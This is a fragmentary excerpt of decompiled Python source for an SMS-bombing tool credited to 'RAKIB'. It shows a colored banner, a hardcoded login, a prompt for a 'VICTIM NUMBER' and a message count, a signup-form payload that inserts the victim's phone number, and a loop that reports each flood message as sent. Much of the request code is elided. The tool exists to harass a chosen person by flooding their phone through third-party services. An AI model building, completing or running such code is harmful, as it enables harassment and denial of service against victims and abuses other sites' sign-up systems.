# Decompile by Mardis (Tools By AB RAKIB )
# Time Succes decompile : 2023-06-12 22:46:08.421029
...
\033[1;94m       [+]        CREATED BY   :  RAKIB            \033[1;94m[+]

\033[1;94m       [+]        ON GITHUB    :  abrakib07               \033[1;94m[+]

\033[1;94m       [+]        WhatsApp         :  01782727379     \033[1;94m[+]

\033[1;94m       [+]        TOOL VERSION :  2.0.0                    \033[1;94m[+]

\033[1;94m       [+]        TOOL STATUS  :  SMS Bombing         \033[1;94m[+]
...
rp= 'RAKIB'
x = '07'
if 'RAKIB'==user and 'ABR'==pas:
	Axak(g+"\n\n\t\t      LOGIN SUCCESSFUL JOIN MY FACEBOOK ")
...
number=input(f"{c}\n[ VICTIM NUMBER ] :{w} +880")
amo=int(input(c+"\n[ AMOUNT ] : "+w))
xak(f"\n\n\t {w}<{r}/{w}> {g}STAY WITH RAKIB-CYBER07 ;) {w}<{r}/{w}>\n\n")
...
data9 = '{"name":"abr70963","email":"'+pwd+'@gmail.com","phone":"0'+number+'","password":"RAKIB","confirmPassword":"RAKIB"}'
url10 = "https://www.facebook.com/ab.rakib.54966"
...
for i in range(amo):
	...
	print(f"\n\t\t {ran2}SMS SENT SUCCESFULLY💚  BY 🔥RAKIB-CYBER07🔥 "+w+tim)
